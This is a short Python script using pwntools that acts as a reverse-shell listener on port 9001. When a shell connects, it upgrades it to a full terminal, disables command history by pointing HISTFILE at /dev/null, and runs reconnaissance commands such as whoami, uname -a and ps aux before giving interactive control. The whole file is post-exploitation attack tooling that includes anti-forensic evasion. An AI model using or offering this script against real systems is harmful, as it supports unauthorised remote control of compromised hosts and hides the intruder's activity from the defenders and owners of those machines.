from pwn import *

l = listen(9001)
l.sendline(""" python -c 'import pty; pty.spawn("/bin/bash")'""")
l.sendline(" export SHELL=bash")
l.sendline(" export HISTFILE=/dev/null")
l.sendline(" export TERM=xterm")
l.sendline(" stty rows 38 columns 116")
l.sendline(""" alias ls='ls -lha --color=auto'""")
l.sendline("hostname")
l.sendline("whoami")
l.sendline("uname -a")
l.sendline("ps aux")
l.interactive()
